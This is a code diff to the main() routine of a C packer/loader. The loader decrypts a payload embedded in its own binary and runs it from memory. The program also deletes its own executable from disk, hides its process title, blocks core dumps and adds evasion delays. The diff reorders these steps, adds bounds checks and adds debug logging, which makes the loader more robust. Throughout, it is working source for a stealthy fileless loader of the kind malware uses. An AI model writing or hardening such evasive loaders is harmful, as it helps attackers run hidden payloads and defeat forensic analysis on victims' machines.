@@ -233,34 +233,40 @@ int main(int argc, char* argv[], char* envp[]) {
     uint8_t* decrypted_data;
     uint32_t calculated_crc;
 
-    unlink(argv[0]);
     prevent_core_dumps();
-    hide_process_title(argc, argv);
 
-    noise_delay(150);
 
     self_fp = fopen("/proc/self/exe", "rb");
     if (!self_fp) {
+        DBG("cannot open /proc/self/exe\n");
         return 1;
     }
+
+    unlink(argv[0]);
+    hide_process_title(argc, argv);
+
+    noise_delay(150);
 
     fseek(self_fp, 0, SEEK_END);
     self_size = ftell(self_fp);
     fseek(self_fp, 0, SEEK_SET);
 
     if (self_size == 0 || self_size > SIZE_MAX / 2) {
+        DBG("invalid self size\n");
         fclose(self_fp);
         return 1;
     }
 
     self_data = malloc(self_size);
     if (!self_data) {
+        DBG("cannot allocate self buffer\n");
         fclose(self_fp);
         return 1;
     }
 
     size_t bytes_read = fread(self_data, 1, self_size, self_fp);
     if (bytes_read != self_size) {
+        DBG("short read from /proc/self/exe\n");
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         fclose(self_fp);
@@ -270,6 +276,7 @@ int main(int argc, char* argv[], char* envp[]) {
 
     header = find_packed_header(self_data, self_size);
     if (!header) {
+        DBG("packed header not found\n");
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         return 1;
@@ -288,14 +295,29 @@ int main(int argc, char* argv[], char* envp[]) {
         exit(0);
     }
 
-    encrypted_data = (uint8_t*)header + sizeof(pack_header_t);
-    if (encrypted_data + header->packed_size > self_data + self_size) {
+    size_t header_offset = (size_t)((uint8_t*)header - self_data);
+    if (header_offset > self_size ||
+        sizeof(pack_header_t) > self_size - header_offset) {
+        DBG("packed header is out of bounds\n");
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         return 1;
     }
+
+    size_t payload_offset = header_offset + sizeof(pack_header_t);
+    size_t payload_bytes = self_size - payload_offset;
+    if (header->original_size == 0 ||
+        header->original_size != header->packed_size ||
+        (size_t)header->packed_size > payload_bytes) {
+        DBG("packed payload sizes are invalid\n");
+        secure_memory_wipe(self_data, self_size);
+        free(self_data);
+        return 1;
+    }
+    encrypted_data = self_data + payload_offset;
     decrypted_data = malloc(header->original_size);
     if (!decrypted_data) {
+        DBG("cannot allocate payload buffer\n");
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         return 1;
@@ -306,6 +328,7 @@ int main(int argc, char* argv[], char* envp[]) {
     multi_layer_decrypt(decrypted_data, header->original_size, header);
     calculated_crc = crc32(decrypted_data, header->original_size);
     if (calculated_crc != header->crc32) {
+        DBG("decrypted payload CRC mismatch\n");
         secure_memory_wipe(decrypted_data, header->original_size);
         secure_memory_wipe(self_data, self_size);
         free(decrypted_data);
@@ -313,6 +336,7 @@ int main(int argc, char* argv[], char* envp[]) {
         return 1;
     }
     if (!is_elf64(decrypted_data)) {
+        DBG("decrypted payload is not ELF64\n");
         secure_memory_wipe(decrypted_data, header->original_size);
         secure_memory_wipe(self_data, self_size);
         free(decrypted_data);
@@ -327,6 +351,7 @@ int main(int argc, char* argv[], char* envp[]) {
         exit(0);
     }
     if (execute_from_memory(decrypted_data, header->original_size, argv, envp) < 0) {
+        DBG("in-memory execution failed\n");
         secure_memory_wipe(decrypted_data, header->original_size);
         secure_memory_wipe(self_data, self_size);
         free(decrypted_data);
